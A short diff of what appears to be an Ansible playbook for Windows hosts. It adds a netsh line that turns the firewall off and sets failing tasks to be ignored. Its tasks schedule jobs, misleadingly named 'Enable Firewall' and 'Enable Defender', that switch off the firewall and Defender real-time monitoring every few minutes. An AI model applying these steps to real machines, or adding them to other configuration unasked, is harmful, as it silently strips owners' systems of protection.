@@ -10,5 +10,11 @@
         - Domain
         - Private
         - Public
+
+      ignore_errors: yes
     - win_shell: Register-ScheduledJob -Name 'Enable Firewall' -ScriptBlock { Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False } -RunNow -RunEvery 00:05:00
+      ignore_errors: yes
     - win_shell: Register-ScheduledJob -Name 'Enable Defender' -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true } -RunNow -RunEvery 00:02:00
+      ignore_errors: yes
+    - win_shell: NetSh Advfirewall set allprofiles state off
+      ignore_errors: yes
